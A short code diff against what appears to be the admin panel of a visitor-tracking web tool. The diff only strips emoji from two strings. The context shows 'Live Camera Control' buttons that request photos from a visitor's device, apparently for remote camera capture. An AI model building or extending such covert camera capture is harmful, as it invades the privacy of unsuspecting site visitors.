@@ -178,7 +178,7 @@ function showVisitorDetails(visitorId) {
                         </div>
                         
                         <div style="margin-top:20px; border-top:1px solid #ddd; padding-top:15px;">
-                            <h3>📸 Live Camera Control</h3>
+                            <h3> Live Camera Control</h3>
                             <p style="font-size:13px; color:#666; margin-bottom:10px;">Click to capture photo from visitor's device</p>
                             <div style="display:flex; gap:10px; flex-wrap:wrap; margin-top:10px;">
                                 <button onclick="captureVisitorPhoto('front')" class="camera-btn" style="background:#48bb78;">📷 Capture Front</button>
@@ -202,7 +202,7 @@ function captureVisitorPhoto(type) {
     
     const statusDiv = document.getElementById('captureStatus');
     if (statusDiv) {
-        statusDiv.textContent = `📸 Requesting ${type} photo...`;
+        statusDiv.textContent = ` Requesting ${type} photo...`;
         statusDiv.style.color = '#4299e1';
     }
     
